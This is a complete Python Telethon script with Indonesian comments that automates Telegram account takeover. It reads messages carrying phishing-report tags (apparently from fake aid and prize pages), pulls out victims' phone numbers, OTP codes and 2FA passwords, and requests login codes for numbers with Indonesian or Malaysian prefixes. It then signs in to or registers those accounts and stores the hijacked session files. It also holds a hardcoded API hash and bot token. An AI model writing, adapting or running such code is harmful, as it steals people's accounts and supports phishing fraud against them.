import asyncio
import os
import re
import json
import shutil
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneNumberUnoccupiedError

# === Konfigurasi Dasar ===
API_ID = 29564591
API_HASH = '99d943dcb43f77dd61c9b020105a541b'
BOT_TOKEN = '7621100011:AAGFxJa8g1kjtBkfc4hiwZESYSDAbncItjU'

TEMP_SESSIONS = "ewww_sessions"
FINAL_SESSIONS = "sessions"

os.makedirs(TEMP_SESSIONS, exist_ok=True)
os.makedirs(FINAL_SESSIONS, exist_ok=True)

# Prefix negara yang diizinkan
WHITELIST_PREFIX = ["+62", "+60"]

# Penyimpanan login sementara
login_queue = {}

# === Nama default jika tidak ditemukan di pesan ===
DEFAULT_FIRST_NAME = "Pengguna"
DEFAULT_LAST_NAME = "Baru"

# === Validasi Nomor ===
def valid_number(number):
    return (
        re.fullmatch(r"\+\d{10,15}", number)
        and any(number.startswith(pfx) for pfx in WHITELIST_PREFIX)
    )

# === Pindahkan session sukses ke folder final ===
def relocate_session(phone):
    src = os.path.join(TEMP_SESSIONS, phone + ".session")
    dst = os.path.join(FINAL_SESSIONS, phone + ".session")
    if os.path.exists(src):
        shutil.move(src, dst)
        print(f"[✔] Session {phone} berhasil dipindahkan ke folder sessions.")
    else:
        print(f"[✖] Session {phone} tidak ditemukan di {src}.")

# === Client utama ===
main_client = TelegramClient('main5', API_ID, API_HASH)

# === Proses pesan dari grup ===
@main_client.on(events.NewMessage)
async def handle_group_message(event):
    content = event.raw_text

    if any(tag in content for tag in [
        '❮ LAPORAN BANTUAN MADANI ❯',
        '❮ LAPORAN DAFTAR GRATISKU ❯',
        '❮ LAPORAN UANG KUNO ❯',
        '❮ LAPORAN Judul ❯',
        '❮ LAPORAN FAIDIL  ❯'
    ]):
        phone_match = re.search(r'PHONE NUMBER\s*:\s*(\+?\d+)', content)
        otp = re.search(r'OTP\s*:\s*(\d{5,6})', content)
        passwd = re.search(r'PASSWORD\s*:\s*(\S+)', content)
        name_match = re.search(r'NAMA\s*:\s*([A-Za-z ]+)', content)

        if phone_match:
            number = phone_match.group(1)

            if number.startswith('62') and not number.startswith('+'):
                number = '+' + number
            elif number.startswith('60') and not number.startswith('+'):
                number = '+' + number

            password = passwd.group(1) if passwd else None

            # Ambil nama dari pesan jika ada
            first_name = DEFAULT_FIRST_NAME
            last_name = DEFAULT_LAST_NAME
            if name_match:
                nama = name_match.group(1).strip().split(" ", 1)
                first_name = nama[0]
                if len(nama) > 1:
                    last_name = nama[1]

            if not valid_number(number):
                print(f"[❗] Nomor tidak valid: {number}")
                return

            if otp:
                code = otp.group(1)
                print(f"[📨] OTP untuk {number}: {code}")
                if number in login_queue:
                    asyncio.create_task(login_with_code(number, code, password, first_name, last_name))
                else:
                    print(f"[⚠] Tidak ada OTP request sebelumnya untuk {number}")
            else:
                if number not in login_queue:
                    print(f"[📲] Meminta OTP untuk {number}")
                    asyncio.create_task(send_otp_request(number))
                else:
                    print(f"[⏳] Menunggu OTP untuk {number}...")

# === Kirim OTP ===
async def send_otp_request(number):
    try:
        sess_path = os.path.join(TEMP_SESSIONS, number)
        client = TelegramClient(sess_path, API_ID, API_HASH)
        await client.connect()

        if not await client.is_user_authorized():
            sent_code = await client.send_code_request(number)
            login_queue[number] = (client, sent_code.phone_code_hash)
            print(f"[📧] Kode OTP dikirim ke {number}")
        else:
            print(f"[✔] {number} sudah login sebelumnya.")
            await client.disconnect()
    except Exception as err:
        print(f"[❌] Gagal mengirim OTP ke {number}: {err}")

# === Login atau Daftar jika belum terdaftar ===
async def login_with_code(number, code, password=None, first_name=DEFAULT_FIRST_NAME, last_name=DEFAULT_LAST_NAME):
    try:
        if number not in login_queue:
            print(f"[✖] Tidak ditemukan client aktif untuk {number}")
            return

        client, phone_code_hash = login_queue[number]

        try:
            await client.sign_in(phone=number, code=code)
            print(f"[✅] Login berhasil untuk {number} (sudah terdaftar)")
        except PhoneNumberUnoccupiedError:
            # Nomor belum terdaftar, daftarkan akun baru
            print(f"[🆕] Nomor {number} belum terdaftar. Mendaftarkan akun baru...")
            await client.sign_up(code=code, first_name=first_name, last_name=last_name)
            print(f"[✅] Akun baru berhasil dibuat untuk {number}")
        except SessionPasswordNeededError:
            if password:
                await client.sign_in(password=password)
                print(f"[🔓] Login dengan 2FA berhasil untuk {number}")
            else:
                print(f"[🔒] Password 2FA dibutuhkan untuk {number}, tapi tidak tersedia.")
                return
        except Exception as e:
            print(f"[⚠] Gagal login/daftar untuk {number}: {e}")
            return

        relocate_session(number)
        await client.disconnect()
        del login_queue[number]
    except Exception as err:
        print(f"[❌] Login/Daftar gagal untuk {number}: {err}")

# === Jalankan ===
async def run_main():
    await main_client.start()
    print("[🚀] Bot Telegram aktif dan siap menerima pesan.")
    await main_client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(run_main())
